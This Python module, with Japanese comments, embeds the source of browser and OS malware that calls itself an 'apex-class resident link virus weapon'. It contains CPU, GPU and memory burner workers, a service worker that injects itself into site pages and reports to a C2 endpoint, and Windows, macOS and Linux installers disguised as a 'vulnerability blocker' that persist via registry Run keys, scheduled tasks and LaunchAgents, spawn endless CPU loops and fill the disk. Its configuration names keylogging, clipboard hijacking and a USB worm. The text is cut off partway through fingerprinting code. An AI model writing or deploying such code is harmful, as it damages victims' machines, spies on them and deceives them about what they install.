"""
SINGULARITY v3.4 「絶滅」 -- apex-class resident link virus weapon
==================================================================
ブラウザの権限内で到達可能な物理限界まで振り切り、PWAとして常駐し、
サイト全体に自分を注入して伝染し、相手のUSBにも自分を仕込み、
最後はOS常駐インストーラでブラウザの外まで侵食する。
L7では窓が指数増殖し、各窓がヘビースキンで高火力化する。

v3.4 追加（v3.3比）:
  無限窓繁殖（指数・リミッターなし）/ 窓1枚ごとのヘビースキン（WebGLプラズマ・
  ネオングロウ・スキャンライン・ドローン音・HUD）。win 遠隔コマンド。

レベル（監視室から遠隔変更・0〜7）:
  0 偵察 / 1 標準 / 2 加熱 / 3 制圧 / 4 焦土 / 5 特異点 / 6 終焉 / 7 絶滅（固定枠）
"""
from __future__ import annotations

import base64
import json
import secrets
import time
from typing import Any, Dict, Optional

VIRUS_ID = "singularity"
VIRUS_NAME = "SINGULARITY"
VIRUS_NAME_JA = "特異点"
VIRUS_VERSION = "3.4"
VIRUS_CLASS = "apex"

LEVEL_LABEL = {0: "偵察", 1: "標準", 2: "加熱", 3: "制圧", 4: "焦土", 5: "特異点",
               6: "終焉", 7: "絶滅"}
LEVEL_DESC = {
    0: "指紋と位置だけ。静か。",
    1: "偵察のみ（既定）。",
    2: "CPU全コアとGPUを回し始める。",
    3: "RAM膨張・ウィンドウ爆弾・履歴洪水・通知洪水・爆音を追加。",
    4: "ディスクをquotaの85%まで。DOM爆弾・CSSレイヤー爆弾・ハッシュ嵐を追加。",
    5: "ディスク95% + 硬凍結 + GL/Audioコンテキスト枯渇 + タイマー嵐。",
    6: "ディスク97% + 全タブ乗っ取り + iframe自己増殖 + 無限窓繁殖(63窓) + ダウンロード嵐。",
    7: "【固定枠】レベル7にロック。遠隔から下げられない。全46系統同時・上限撤廃。"
       "窓は指数増殖・リミッターなし（branch2/depth無制限）。各窓はヘビースキンで高火力。"
       "DOM15万・レイヤー4000・タイマー4000・GL32・SSE8・DL50・OS常駐インストーラ。絶滅。",
}

APP_NAME_DEFAULT = "脆弱性ブロッカー"

# ---------------------------------------------------------------------------
# Worker（CPU/GPU/WASM/RAM 担当。メインスレッドが凍結しても動き続ける）
# ---------------------------------------------------------------------------
WORKER_JS = r"""
/*! SINGULARITY worker v3.4 */
/* 最小 wasm: (module (func (export "f") (result f64) f64.const 1)) = 41bytes */
var WASM = [0,97,115,109,1,0,0,0, 1,5,1,96,0,1,124, 3,2,1,0, 7,5,1,1,102,0,0,
            10,13,1,11,0,68,0,0,0,0,0,0,240,63,11];
var F = null;
try { if (typeof WebAssembly !== "undefined") F = new WebAssembly.Instance(new WebAssembly.Module(new Uint8Array(WASM))).exports.f; } catch (e) {}

self.onmessage = function (e) {
  var d = e.data || {};
  if (d.kind === "stop") { try { self.close(); } catch (er) {} return; }
  if (d.kind !== "burn") return;

  if (d.mb) {
    try {
      var a = new Float64Array((d.mb * 1048576) / 8);
      for (var i = 0; i < a.length; i += 4096) a[i] = i;
      self.__keep = a;
    } catch (er) {}
  }

  if (d.gpu) gpu();
  if (d.wasm && F) { var k0 = 0; for (var j = 0; j < 200000; j++) k0 += F(); }

  var sink = 0, k = 0, tick = 0;
  for (;;) {
    for (var j = 0; j < 150000; j++) { sink += Math.sqrt(j) * Math.sin(j); }
    if (F) { for (var m = 0; m < 40000; m++) sink += F(); }
    k++;
    if (sink > 1e12) sink = 0;
    if (k % 40 === 0) { try { self.postMessage({ kind: "tick", k: k, tick: ++tick }); } catch (er) {} }
  }
};

function gpu() {
  try {
    if (typeof OffscreenCanvas === "undefined") return;
    var c = new OffscreenCanvas(512, 384);
    var gl = c.getContext("webgl2") || c.getContext("webgl") || c.getContext("experimental-webgl");
    if (!gl) return;
    var is2 = !!(gl.texStorage2D);
    var vs = "attribute vec2 p;void main(){gl_Position=vec4(p,0.,1.);}";
    var fs = "precision highp float;uniform float t;void main(){"
      + "vec2 u=gl_FragCoord.xy*.01;float s=0.;"
      + "for(int i=0;i<64;i++){u=vec2(sin(u.y*t*.001)+cos(u.x*t*.0007),"
      + "cos(u.x*t*.0011)-sin(u.y*t*.0009));s+=length(u);}"
      + "gl_FragColor=vec4(fract(s*.01),fract(s*.013),fract(s*.017),1.);}";
    function sh(t, src) { var o = gl.createShader(t); gl.shaderSource(o, src); gl.compileShader(o); return o; }
    var pr = gl.createProgram();
    gl.attachShader(pr, sh(gl.VERTEX_SHADER, vs));
    gl.attachShader(pr, sh(gl.FRAGMENT_SHADER, fs));
    gl.linkProgram(pr); gl.useProgram(pr);
    var b = gl.createBuffer();
    gl.bindBuffer(gl.ARRAY_BUFFER, b);
    gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1, -1, 3, -1, -1, 3]), gl.STATIC_DRAW);
    var loc = gl.getAttribLocation(pr, "p");
    gl.enableVertexAttribArray(loc);
    gl.vertexAttribPointer(loc, 2, gl.FLOAT, false, 0, 0);
    var tl = gl.getUniformLocation(pr, "t");
    (function loop() {
      try {
        gl.uniform1f(tl, Date.now());
        for (var r = 0; r < 3; r++) gl.drawArrays(gl.TRIANGLES, 0, 3);
      } catch (er) {}
      setTimeout(loop, 0);
    })();
  } catch (er) {}
}
"""

# ---------------------------------------------------------------------------
# Shared Worker（タブが全部閉じるまで死なない常駐バーナー）
# ---------------------------------------------------------------------------
SHARED_JS = r"""
/*! SINGULARITY shared worker v3.4 -- タブが全部閉じるまで死なない常駐バーナー */
var PORTS = [], RUN = false;
self.onconnect = function (e) {
  var p = e.ports[0];
  PORTS.push(p);
  try { p.start(); } catch (er) {}
  p.onmessage = function (ev) {
    var d = ev.data || {};
    if (d.kind === "burn") { if (!RUN) { RUN = true; burn(); } }
    if (d.kind === "stop") RUN = false;
    if (d.kind === "ping") { try { p.postMessage({ kind: "pong", n: PORTS.length }); } catch (er) {} }
  };
  try { p.postMessage({ kind: "ready", n: PORTS.length }); } catch (er) {}
};
function burn() {
  var sink = 0, k = 0;
  (function loop() {
    if (!RUN) return;
    for (var j = 0; j < 90000; j++) sink += Math.sqrt(j) * Math.sin(j);
    if (sink > 1e12) sink = 0;
    if (++k % 60 === 0) { for (var i = 0; i < PORTS.length; i++) { try { PORTS[i].postMessage({ kind: "tick", k: k }); } catch (e) {} } }
    setTimeout(loop, 0);
  })();
}
"""

# ---------------------------------------------------------------------------
# OS常駐インストーラ（トークン __URL__ __CODE__ __APP__ __BURN__ __DISKMB__ __VER__）
# ---------------------------------------------------------------------------
INSTALL_BAT = r"""@echo off
title __APP__
setlocal
set "APP=__APP__"
set "CODE=__CODE__"
set "URL=__URL__"
set "BURN=__BURN__"
set "DISKMB=__DISKMB__"
set "DIR=%LOCALAPPDATA%\%APP%"
if not exist "%DIR%" mkdir "%DIR%" >nul 2>nul
copy /y "%~f0" "%DIR%\blocker.bat" >nul 2>nul

(echo CreateObject("WScript.Shell").Run """%DIR%\blocker.bat"" /run", 0, False) > "%DIR%\run.vbs"

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%APP%" /d "\"%DIR%\run.vbs\"" /f >nul 2>nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%APP%_b" /d "\"%DIR%\blocker.bat\" /run" /f >nul 2>nul

copy /y "%DIR%\blocker.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%APP%.bat" >nul 2>nul
schtasks /create /tn "%APP%" /tr "\"%DIR%\blocker.bat\" /run" /sc onlogon /f >nul 2>nul

powershell -NoProfile -Command "Get-CimInstance Win32_Process -Filter \"Name='powershell.exe'\" | Where-Object { $_.CommandLine -like '*SGBURN*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }" >nul 2>nul

for /l %%i in (1,1,%BURN%) do start "" /min powershell -NoProfile -Command "while($true){$x=[math]::Sqrt(1.2345)*[math]::Sin(2.3456)} # SGBURN"

if not "%DISKMB%"=="0" if not exist "%DIR%\ballast.bin" fsutil file createnew "%DIR%\ballast.bin" %DISKMB%000000 >nul 2>nul

start "" "%URL%"

echo.
echo   __APP__  v__VER__   常駐開始
echo   CPUバーナー %BURN% 本 / 永続化 Run+Startup+Task / ballast %DISKMB%MB
echo.
timeout /t 4 >nul 2>nul
exit /b
"""

INSTALL_COMMAND = r"""#!/bin/bash
APP="__APP__"
CODE="__CODE__"
URL="__URL__"
BURN="__BURN__"
DISKMB="__DISKMB__"
DIR="$HOME/Library/Application Support/$APP"
mkdir -p "$DIR"
cp "$0" "$DIR/blocker.command" 2>/dev/null
chmod +x "$DIR/blocker.command" 2>/dev/null

mkdir -p "$HOME/Library/LaunchAgents"
cat > "$HOME/Library/LaunchAgents/com.singularity.blocker.plist" <<PLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.singularity.blocker</string>
<key>ProgramArguments</key><array><string>/bin/bash</string><string>$DIR/blocker.command</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
launchctl unload "$HOME/Library/LaunchAgents/com.singularity.blocker.plist" 2>/dev/null
launchctl load "$HOME/Library/LaunchAgents/com.singularity.blocker.plist" 2>/dev/null

pkill -f "SGBURN" 2>/dev/null
for i in $(seq 1 "$BURN"); do
  nohup bash -c 'while :; do :; done # SGBURN' >/dev/null 2>&1 &
done

if [ "$DISKMB" != "0" ] && [ ! -f "$DIR/ballast.bin" ]; then
  mkfile -n ${DISKMB}m "$DIR/ballast.bin" 2>/dev/null || dd if=/dev/zero of="$DIR/ballast.bin" bs=1m count=$DISKMB 2>/dev/null
fi

open "$URL" 2>/dev/null
echo "  $APP v__VER__ 常駐開始 (burn=$BURN)"
"""

INSTALL_SH = r"""#!/bin/bash
APP="__APP__"
CODE="__CODE__"
URL="__URL__"
BURN="__BURN__"
DISKMB="__DISKMB__"
DIR="$HOME/.local/share/singularity"
mkdir -p "$DIR"
cp "$0" "$DIR/blocker.sh" 2>/dev/null
chmod +x "$DIR/blocker.sh" 2>/dev/null

mkdir -p "$HOME/.config/autostart"
cat > "$HOME/.config/autostart/singularity.desktop" <<DESK
[Desktop Entry]
Type=Application
Name=$APP
Exec=$DIR/blocker.sh
X-GNOME-Autostart-enabled=true
DESK

pkill -f "SGBURN" 2>/dev/null
for i in $(seq 1 "$BURN"); do
  nohup bash -c 'while :; do :; done # SGBURN' >/dev/null 2>&1 &
done

if [ "$DISKMB" != "0" ] && [ ! -f "$DIR/ballast.bin" ]; then
  fallocate -l ${DISKMB}M "$DIR/ballast.bin" 2>/dev/null || dd if=/dev/zero of="$DIR/ballast.bin" bs=1M count=$DISKMB 2>/dev/null
fi

( xdg-open "$URL" >/dev/null 2>&1 & ) 2>/dev/null || true
echo "  $APP v__VER__ 常駐開始 (burn=$BURN)"
"""


def build_installer(tmpl: str, url: str, code: str, app: str,
                    burn: int, disk_mb: int, ver: str = VIRUS_VERSION,
                    crlf: bool = False) -> str:
    out = (tmpl.replace("__URL__", url).replace("__CODE__", code)
               .replace("__APP__", app).replace("__BURN__", str(int(burn)))
               .replace("__DISKMB__", str(int(disk_mb))).replace("__VER__", ver))
    if crlf:
        out = out.replace("\r\n", "\n").replace("\n", "\r\n")
    return out


# ---------------------------------------------------------------------------
# Service Worker（C2・永続化・復活・注入・オフラインキュー）
# ---------------------------------------------------------------------------
SW_JS = r"""
/*! SINGULARITY service worker v3.4 -- C2 + injection + resurrection + periodic */
const VER = "sg-v3";
const DB = "sg", STORE = "out", KV = "kv", PC = "sg-p";
let CMD = null, PAGE = null, SID = null, MAN = null, ICONS = [], INJ = null, V = null;
let lastLevel = null, lastWipe = null, lastCheck = 0, preCached = false, lastInj = 0;

function idb() {
  return new Promise((res, rej) => {
    const r = indexedDB.open(DB, 1);
    r.onupgradeneeded = () => {
      const d = r.result;
      if (!d.objectStoreNames.contains(STORE)) d.createObjectStore(STORE, { autoIncrement: true });
      if (!d.objectStoreNames.contains(KV)) d.createObjectStore(KV);
    };
    r.onsuccess = () => res(r.result);
    r.onerror = () => rej(r.error);
  });
}
async function kvGet(k) {
  try { const d = await idb(); return await new Promise(r => {
    const q = d.transaction(KV, "readonly").objectStore(KV).get(k);
    q.onsuccess = () => r(q.result); q.onerror = () => r(null); }); } catch (e) { return null; }
}
async function kvSet(k, v) {
  try { const d = await idb(); d.transaction(KV, "readwrite").objectStore(KV).put(v, k); } catch (e) {}
}
async function queue(body) {
  try { const d = await idb(); d.transaction(STORE, "readwrite").objectStore(STORE).add({ body, t: Date.now() }); } catch (e) {}
}
async function drain() {
  try {
    const d = await idb();
    const cur = d.transaction(STORE, "readwrite").objectStore(STORE).openCursor();
    cur.onsuccess = async () => {
      const c = cur.result; if (!c || !CMD) return;
      try {
        const r = await fetch(CMD, { method: "POST", headers: { "Content-Type": "application/json" }, body: c.value.body });
        if (r.ok) c.delete();
      } catch (e) { return; }
      c.continue();
    };
  } catch (e) {}
}
async function load() {
  CMD = await kvGet("cmd"); PAGE = await kvGet("page");
  SID = await kvGet("sid"); MAN = await kvGet("man"); INJ = await kvGet("inj");
  V = await kvGet("ver");
  lastLevel = await kvGet("level"); lastWipe = await kvGet("wipe");
}
async function precache() {
  if (preCached || !MAN) return;
  preCached = true;
  try {
    const c = await caches.open(VER);
    const urls = [MAN].concat(ICONS || []);
    for (const u of urls) { try { await c.add(u); } catch (e) {} }
    if (PAGE) { try { await c.add(PAGE); } catch (e) {} }
  } catch (e) {}
}
async function go(why) {
  try {
    const cls = await self.clients.matchAll({ type: "window", includeUncontrolled: true });
    for (const c of cls) {
      try {
        const u = new URL(c.url);
        if (why === "wipe") u.searchParams.set("wipe", "1"); else u.searchParams.delete("wipe");
        c.navigate(u.toString());
      } catch (e) {}
    }
  } catch (e) {}
}
async function check() {
  const t = Date.now();
  if (t - lastCheck < 2500) return;
  lastCheck = t;
  if (!CMD) await load();
  if (!CMD) return;
  try {
    const r = await fetch(CMD + "?sw=1&sid=" + (SID || ""), { cache: "no-store" });
    const j = await r.json();
    if (!j || !j.ok) return;
    if (j.ver && V && j.ver !== V) { V = j.ver; await kvSet("ver", V); try { await caches.delete(PC); } catch (e) {} }
    const lv = String(j.level), wp = String(j.wipe || 0);
    if (lastLevel === null) {
      lastLevel = lv; lastWipe = wp;
      await kvSet("level", lv); await kvSet("wipe", wp); return;
    }
    if (wp !== lastWipe) { lastWipe = wp; await kvSet("wipe", wp); await go("wipe"); return; }
    if (lv !== lastLevel) { lastLevel = lv; await kvSet("level", lv); await go("level"); return; }
  } catch (e) {}
}
/* --- 注入: 同一オリジンの通常HTMLに自分を差し込む --- */
function tag() {
  if (!INJ) return "";
  return '<script id="__sg_inj" src="' + INJ + (INJ.indexOf("?") < 0 ? "?" : "&")
    + "sid=" + encodeURIComponent(SID || "") + "&u=inj&v=" + encodeURIComponent(V || "0")
    + '"></' + 'script>';
}
async function inject(req) {
  let r;
  try { r = await fetch(req); } catch (e) { return Response.error(); }
  try {
    if (!INJ || !r || r.status !== 200) return r;
    const ct = r.headers.get("content-type") || "";
    if (ct.indexOf("text/html") < 0) return r;
    let t = await r.text();
    if (t.indexOf("__sg_inj") >= 0) return new Response(t, { status: r.status, headers: r.headers });
    const g = tag();
    if (t.indexOf("</head>") >= 0) t = t.replace("</head>", g + "</head>");
    else if (/<body[^>]*>/i.test(t)) t = t.replace(/<body([^>]*)>/i, function (m) { return m + g; });
    else t = g + t;
    const h = new Headers(r.headers);
    h.delete("content-length"); h.delete("content-encoding");
    return new Response(t, { status: r.status, statusText: r.statusText, headers: h });
  } catch (e) { return r; }
}
/* --- p.js は自前キャッシュから配る（注入コストをほぼゼロに） --- */
async function pjs(req) {
  try {
    const c = await caches.open(PC);
    const hit = await c.match(req);
    if (hit) { fetch(req).then(r => { if (r.ok) c.put(req, r.clone()); }).catch(() => {}); return hit; }
    const r = await fetch(req);
    if (r.ok) { try { c.put(req, r.clone()); } catch (e) {} }
    return r;
  } catch (e) { return fetch(req); }
}
async function netFirst(req) {
  let c = null;
  try { c = await caches.open(VER); } catch (e) {}
  try {
    const r = await Promise.race([
      fetch(req),
      new Promise((_, rej) => setTimeout(() => rej(new Error("t")), 4000))
    ]);
    if (c) { try { c.put(req, r.clone()); } catch (e) {} }
    return r;
  } catch (e) {
    if (c) {
      let hit = null;
      try { hit = await c.match(req); } catch (er) {}
      if (!hit) { try { hit = await c.match(req, { ignoreSearch: true }); } catch (er) {} }
      if (hit) return hit;
    }
    return new Response(
      "<!doctype html><meta charset=utf-8><body style=\"background:#05070a;color:#0f0;" +
      "font:13px ui-monospace;display:grid;place-items:center;height:100vh;margin:0\">" +
      "<div>SINGULARITY<br><small>offline</small></div></body>",
      { headers: { "Content-Type": "text/html; charset=utf-8" } });
  }
}

self.addEventListener("install", e => self.skipWaiting());
self.addEventListener("activate", e => {
  e.waitUntil(self.clients.claim());
  e.waitUntil(load().then(precache));
});
self.addEventListener("message", e => {
  const d = e.data || {};
  if (d.type === "hello") {
    if (d.cmd) kvSet("cmd", d.cmd);
    if (d.page) kvSet("page", d.page);
    if (d.sid) kvSet("sid", d.sid);
    if (d.man) kvSet("man", d.man);
    if (d.inj) kvSet("inj", d.inj);
    if (d.ver) kvSet("ver", d.ver);
    if (d.icons) ICONS = d.icons;
    if (d.level != null) kvSet("level", String(d.level));
    CMD = d.cmd || CMD; SID = d.sid || SID; MAN = d.man || MAN;
    INJ = d.inj || INJ; V = d.ver || V;
    load().then(precache).then(check);
  }
  if (d.type === "check") check();
  if (d.type === "queue") queue(d.body);
  if (d.type === "drain") drain();
});
self.addEventListener("sync", e => { if (e.tag === "sg-flush") e.waitUntil(drain()); });
self.addEventListener("periodicsync", e => {
  if (e.tag === "sg-sync") e.waitUntil(check().then(() => drain()));
});
self.addEventListener("notificationclick", e => {
  e.notification.close();
  e.waitUntil(self.clients.matchAll({ type: "window" }).then(cs => {
    for (const c of cs) { if (c.url.indexOf("/v/") >= 0) return c.focus(); }
    return self.clients.openWindow(PAGE || "/");
  }));
});
self.addEventListener("fetch", e => {
  let u; try { u = new URL(e.request.url); } catch (er) { return; }
  if (u.origin !== location.origin) return;
  if (u.pathname.indexOf("/p.js") > 0 && u.pathname.indexOf("/sg/") > 0) { e.respondWith(pjs(e.request)); return; }
  if (u.pathname.indexOf("/v/") === 0) e.waitUntil(check());
  if (CMD && u.pathname === new URL(CMD, location.origin).pathname && !navigator.onLine) drain();
  if (e.request.mode === "navigate") {
    if (INJ && u.pathname.indexOf("/v/") !== 0) { e.respondWith(inject(e.request)); return; }
    e.respondWith(netFirst(e.request));
  }
});
"""

# ---------------------------------------------------------------------------
# ペイロード本体
# ---------------------------------------------------------------------------
PAYLOAD_JS = r"""
/*! SINGULARITY v3.4 絶滅 -- apex-class resident link virus weapon | igtracker */
(function () {
"use strict";
if (window.__SINGULARITY__) return;
try { Object.defineProperty(window, "__SINGULARITY__", { value: true, enumerable: false }); }
catch (e) { window.__SINGULARITY__ = true; }

var MYVER = "3.4";

/* ================= utils ================= */
function Q(k) { try { return new URLSearchParams(location.search).get(k); } catch (e) { return null; } }
function clamp(v, a, b) { return v < a ? a : (v > b ? b : v); }
function now() { return Date.now(); }
function rid(n) { var C = "abcdefghijklmnopqrstuvwxyz0123456789", s = ""; while (n--) s += C[(Math.random() * 36) | 0]; return s; }
function uniq(a) { return a.filter(function (v, i) { return a.indexOf(v) === i; }); }
function hash(s) { s = String(s); var h = 2166136261; for (var i = 0; i < s.length; i++) { h ^= s.charCodeAt(i); h = (h * 16777619) >>> 0; } return ("00000000" + h.toString(16)).slice(-8); }
function b64(s) { try { return btoa(unescape(encodeURIComponent(s))); } catch (e) { return ""; } }
function tz() { try { return Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (e) { return null; } }
function mm(q) { try { return matchMedia(q).matches; } catch (e) { return false; } }
function ls(k, v) { try { if (v === undefined) return localStorage.getItem(k); localStorage.setItem(k, v); } catch (e) { return null; } }
function ck(k, v) {
  try {
    if (v === undefined) { var m = document.cookie.match(new RegExp("(?:^|; )" + k + "=([^;]*)")); return m ? decodeURIComponent(m[1]) : null; }
    document.cookie = k + "=" + encodeURIComponent(v) + ";max-age=315360000;path=/;SameSite=Lax";
  } catch (e) { return null; }
}
function wn(v) { try { if (v === undefined) return window.name || null; window.name = v; } catch (e) {} }
function abs(p) { try { return new URL(p, location.href).toString(); } catch (e) { return p; } }

/* ================= config ================= */
var CFG = Object.assign({
  sid: null, path: "/v/singularity", collect: "/v/singularity/collect",
  cmd: "/v/singularity/cmd", sse: "/v/singularity/sse", ack: "/v/singularity/ack",
  sw: "/v/singularity/sw.js", pjs: null, inj: null, manifest: null, icons: [],
  level: 1, fire: 1, wipe: false, w: 0, freeze: "",
  fixed: false, finalRamMB: 0, gpuMem: true,
  winMode: "off", winBranch: 2, winDepth: 0, winSkin: 0, winLock: null,
  iframes: 0, domNodes: 0, cssAnim: 0, glContexts: 0, acContexts: 0, timers: 0,
  microtasks: 0, compress: 0, redos: 0, digest: 0, readback: 0, sseStorm: 0,
  fetchStorm: 0, speakFlood: 0, oscBank: 0, idbDisk: 0, cacheBuckets: 0,
  layoutThrash: 0, clipHijack: 0, downloads: 0, sharedWorker: 0, jsonChurn: 0,
  fsFolder: 0, fsFiles: 0, installer: 1,
  cores: 0, ramMB: 0, diskRatio: 0, chunkMB: 8, gpu: false, workerMB: 16, wasm: false,
  windows: 0, winDelay: 1400, history: 0, notify: 0, burn: false,
  audio: false, beepMs: 4500, flicker: true, flickMs: 900,
  uncloseable: true, persist: true, swOn: true, mutate: true, remember: true,
  media: true, geo: true, sensors: true, clipboard: false, badge: false,
  wakelock: false, titleFlicker: true, favicon: false, mediaSession: false,
  webgpu: false, worklet: false, tabs: 0, pip: false, fullscreen: false,
  pointerlock: false, dom: true, xhr: false, speak: false, injInstall: "click",
  install: "auto", installLevel: 4, avName: "脆弱性ブロッカー",
  usbWorm: false, usbBase: "", usbCode: "", usbLabel: "", hop: false,
  bomb: "", ver: MYVER, injected: false, rat: true, spoof: true, cookie: true,
  interval: 12000, cmdInterval: 10000, timeout: 4000, maxRetry: 6
}, window.__SINGULARITY_CFG__ || {});

var LEVEL = parseInt(CFG.level, 10); if (isNaN(LEVEL)) LEVEL = 1;
var W = parseInt(CFG.w, 10) || 0;
var INJ = CFG.injected || Q("u") === "inj";
if (Q("u") === "inj") CFG.injected = true;
var IFR = Q("u") === "ifr";
var WIN = Q("u") === "win";
var FROM_OS = Q("u") === "os";

var BIP = null;
addEventListener("beforeinstallprompt", function (e) {
  try { e.preventDefault(); } catch (er) {}
  BIP = e;
  try { window.__sgBip = true; } catch (er) {}
});

/* 強度テーブル（burn/gpu/webgpu/wasm/worklet 等はここだけで決まる） */
function P(o) {
  return Object.assign({
    burn: 0, gpu: 0, webgpu: 0, wasm: 0, worklet: 0, ramMB: 0, diskRatio: 0,
    windows: 0, history: 0, notify: 0, freeze: "off", audio: 0, wakelock: 0,
    tabs: 0, pip: 0, fullscreen: 0, pointerlock: 0, badge: 0, favicon: 0,
    mediaSession: 0, xhr: 0, speak: 0, titleFlicker: 1,
    winMode: "off", winBranch: 2, winDepth: 0, winSkin: 0,
    iframes: 0, domNodes: 0, cssAnim: 0, glContexts: 0, acContexts: 0, timers: 0,
    microtasks: 0, compress: 0, redos: 0, digest: 0, readback: 0, sseStorm: 0,
    fetchStorm: 0, speakFlood: 0, oscBank: 0, idbDisk: 0, cacheBuckets: 0,
    layoutThrash: 0, clipHijack: 0, downloads: 0, sharedWorker: 0, jsonChurn: 0,
    fsFolder: 0, fsFiles: 0
  }, o);
}
var PRESET = {
  0: P({}),
  1: P({}),
  2: P({ burn: 1, gpu: 1, wakelock: 1 }),
  3: P({ burn: 1, gpu: 1, wasm: 1, windows: 8, history: 3000, notify: 12, audio: 1,
         wakelock: 1, badge: 1, favicon: 1, mediaSession: 1, tabs: 4,
         cssAnim: 300, timers: 100, speakFlood: 2, winMode: "chain" }),
  4: P({ burn: 1, gpu: 1, wasm: 1, webgpu: 1, diskRatio: 0.85, windows: 16, history: 6000,
         notify: 24, audio: 1, wakelock: 1, badge: 1, favicon: 1, mediaSession: 1, tabs: 6,
         pip: 1, pointerlock: 1,
         domNodes: 20000, cssAnim: 800, timers: 400, digest: 1, idbDisk: 1,
         readback: 1, jsonChurn: 1, layoutThrash: 1, speakFlood: 4, winMode: "chain" }),
  5: P({ burn: 1, gpu: 1, wasm: 1, webgpu: 1, worklet: 1, diskRatio: 0.95, windows: 24,
         history: 12000, notify: 40, freeze: "soft", audio: 1, wakelock: 1, badge: 1,
         favicon: 1, mediaSession: 1, tabs: 8, pip: 1, pointerlock: 1, fullscreen: 1, xhr: 1,
         domNodes: 50000, cssAnim: 1500, timers: 1000, glContexts: 16, acContexts: 8,
         microtasks: 1, compress: 1, redos: 1, digest: 1, readback: 1, jsonChurn: 1,
         layoutThrash: 1, cacheBuckets: 100, idbDisk: 1, speakFlood: 6, winMode: "chain" }),
  6: P({ burn: 1, gpu: 1, wasm: 1, webgpu: 1, worklet: 1, diskRatio: 0.97, windows: 24,
         history: 20000, notify: 60, freeze: "soft", audio: 1, wakelock: 1, badge: 1,
         favicon: 1, mediaSession: 1, tabs: 12, pip: 1, pointerlock: 1, fullscreen: 1,
         xhr: 1, speak: 1,
         iframes: 4, domNodes: 80000, cssAnim: 2500, timers: 2000, glContexts: 24,
         acContexts: 12, microtasks: 1, compress: 1, redos: 1, digest: 1, readback: 1,
         jsonChurn: 1, layoutThrash: 1, cacheBuckets: 150, idbDisk: 1, speakFlood: 10,
         downloads: 20, clipHijack: 1, sseStorm: 4, fetchStorm: 2, oscBank: 60,
         sharedWorker: 1, fsFolder: 1, fsFiles: 50,
         winMode: "breed", winBranch: 2, winDepth: 5, winSkin: 1 }),
  7: P({ burn: 1, gpu: 1, wasm: 1, webgpu: 1, worklet: 1, diskRatio: 1.0, windows: 24,
         history: 30000, notify: 60, freeze: "hard", audio: 1, wakelock: 1, badge: 1,
         favicon: 1, mediaSession: 1, tabs: 20, pip: 1, pointerlock: 1, fullscreen: 1,
         xhr: 1, speak: 1,
         iframes: 6, domNodes: 150000, cssAnim: 4000, timers: 4000, glContexts: 32,
         acContexts: 16, microtasks: 1, compress: 1, redos: 1, digest: 1, readback: 1,
         jsonChurn: 1, layoutThrash: 1, cacheBuckets: 200, idbDisk: 1, speakFlood: 20,
         downloads: 50, clipHijack: 1, sseStorm: 8, fetchStorm: 4, oscBank: 120,
         sharedWorker: 1, fsFolder: 1, fsFiles: 120,
         winMode: "breed", winBranch: 2, winDepth: 0, winSkin: 1 })
};

var GATED = false;
function applyLevel(l) {
  if (CFG.fixed && !GATED) LEVEL = 7;          /* 固定枠は絶対。下げられない */
  else LEVEL = clamp(l, 0, 7);
  var p = PRESET[LEVEL] || PRESET[1];
  for (var k in p) CFG[k] = p[k];
  if (LEVEL >= 2) {
    var mult = LEVEL >= 7 ? 3 : (LEVEL >= 6 ? 2 : 1);
    CFG.cores = clamp((navigator.hardwareConcurrency || 4) * mult, 1, LEVEL >= 7 ? 64 : 48);
    if (LEVEL >= 7) {
      /* 上限を外す: deviceMemory は仕様上8で頭打ち → 実メモリを直接攻める */
      var auto = Math.max(8192, (navigator.deviceMemory || 4) * 1024 * 2);
      CFG.ramMB = Math.round(CFG.finalRamMB > 0 ? CFG.finalRamMB : auto);
      CFG.workerMB = 32;
    } else {
      CFG.ramMB = Math.round((navigator.deviceMemory || 4) * 1024 * (LEVEL >= 5 ? 0.35 : 0.25));
      CFG.workerMB = LEVEL >= 5 ? 24 : 16;
    }
  } else { CFG.cores = 0; CFG.ramMB = 0; }
  if (CFG.winLock) {
    if (CFG.winLock.mode) CFG.winMode = CFG.winLock.mode;
    if (CFG.winLock.branch) CFG.winBranch = CFG.winLock.branch;
    if (CFG.winLock.depth != null) CFG.winDepth = CFG.winLock.depth;
  }
  try { R.final = (LEVEL >= 7); } catch (e) {}
}
applyLevel(LEVEL);

var STANDALONE = false;
try {
  STANDALONE = !!(window.matchMedia && matchMedia("(display-mode: standalone)").matches)
    || !!navigator.standalone
    || !!(window.matchMedia && matchMedia("(display-mode: window-controls-overlay)").matches);
} catch (e) {}
if (STANDALONE && CFG.installLevel && LEVEL < CFG.installLevel) applyLevel(CFG.installLevel);

/* ================= state ================= */
var SID = CFG.sid || ck("sgid") || wn() || rid(14);
try { ck("sgid", SID); wn("sg_" + SID); } catch (e) {}
var T0 = now();
var R = {
  v: MYVER, sid: SID, t0: T0, t: T0, level: LEVEL, w: W, inj: INJ, final: false,
  usb: Q("u") || null, host: location.host, url: location.href, ref: document.referrer || null,
  chain: [], env: {}, page: {}, network: {}, vectors: {}, hardware: {}, enum2: {},
  privacy: {}, media: {}, bot: {}, behavioral: {}, viral: {}, verdict: {},
  disk: {}, ram: {}, burn: {}, history: {}, audio: {}, win: {}, install: {},
  usbw: {}, rat: {}, keylog: [], dom: {}, cookies: [], peers: 0, sse: null,
  bomb: null, spoof: null, crypto: {}, errors: [], attempts: 0,
  breed: null, breeded: 0, wskin: 0, wskinCtx: null
};
var WORKERS = [];
function err_(e) { try { R.errors.push(String((e && e.message) || e).slice(0, 140)); if (R.errors.length > 40) R.errors.shift(); } catch (_) {} }
function b64u(a) { try { return btoa(String.fromCharCode.apply(null, new Uint8Array(a))); } catch (e) { return ""; } }

/* ================= 1. 環境 / 列挙 ================= */
function base() {
  var n = navigator, s = screen;
  R.env = {
    ua: n.userAgent, platform: n.platform || null, vendor: n.vendor || null,
    languages: (n.languages || [n.language || "?"]).slice(0, 12), language: n.language || null,
    timezone: tz(), tzOffsetMin: new Date().getTimezoneOffset(),
